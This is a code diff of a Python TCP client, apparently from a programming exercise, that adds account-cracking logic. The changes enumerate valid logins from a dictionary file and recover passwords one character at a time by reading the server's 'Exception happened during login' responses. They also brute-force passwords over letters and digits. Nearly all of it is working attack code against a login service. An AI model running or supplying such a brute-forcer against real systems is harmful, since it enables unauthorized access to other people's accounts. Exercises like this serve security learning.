@@ -1,4 +1,6 @@
 import argparse
+import json
+import string
 from socket import socket
 from itertools import product
 
@@ -29,22 +31,55 @@ class TCPClient:
         return self.socket.recv(1024).decode()
 
 
-class Passwords:
+class Crack:
     def __init__(self, conn):
         self.conn = conn
 
+    def find_login(self, dictionary):
+        with open(dictionary, 'r') as dictionary:
+            for login in dictionary:
+                login = login.strip('\n')
+                data = json.dumps({'login': login, 'password': ''})
+                self.conn.send_data(data)
+                resp = json.loads(self.conn.read_data())
+                if resp.get('result') == 'Exception happened during login':
+                    return login
+            return False
+
+    def find_password(self, login, start_with=''):
+        for password in Crack.generate_password():
+            data = json.dumps({'login': login, 'password': start_with + password})
+            self.conn.send_data(data)
+            resp = json.loads(self.conn.read_data())
+            if resp.get('result') == 'Exception happened during login':
+                self.find_password(login, start_with + password)
+                break
+            if resp.get('result') == 'Connection success!':
+                print(data)
+                return data
+
     def brute_password(self):
-        for password in Passwords.generate_password():
-            if self.check_password(''.join(map(str, password))):
+        for password in Crack.generate_password():
+            if self.check_password(password):
                 print(password)
                 break
 
     def dict_mod(self, dictionary):
         with open(dictionary, 'r') as dictionary:
-            for password in Passwords.case_swith(dictionary):
+            for password in Crack.case_swith(dictionary):
                 if self.check_password(password):
                     print(password)
                     break
+
+    def check_password(self, password):
+        self.conn.send_data(password)
+        resp = self.conn.read_data()
+        if resp == 'Connection success!':
+            return password
+        if resp == 'Too many attempts':
+            return resp
+        return False
+
 
     @staticmethod
     def case_swith(dictionary):
@@ -56,21 +91,13 @@ class Passwords:
                 for val in product(*([letter.lower(), letter.upper()] for letter in password)):
                     yield ''.join(val)
 
-    def check_password(self, password):
-        self.conn.send_data(password)
-        resp = self.conn.read_data()
-        if resp == 'Connection success!':
-            return password
-        if resp == 'Too many attempts':
-            return 'Too many attempts'
-        return False
-
     @staticmethod
     def generate_password():
         index = 1
         while True:
-            charset = 'abcdefghijklmnopqrstuvwxyz1234567890'
-            yield from product(charset, repeat=index)
+            charset = string.ascii_letters + string.digits
+            for password in product(charset, repeat=index):
+                yield ''.join(map(str, password))
             index += 1
 
 
@@ -82,7 +109,8 @@ def main():
 
     conn = TCPClient(args.host, args.port)
     conn.connect()
-    Passwords(conn).dict_mod('passwords.txt')
+    login = Crack(conn).find_login('logins.txt')
+    Crack(conn).find_password(login)
     conn.disconnect()
 
 
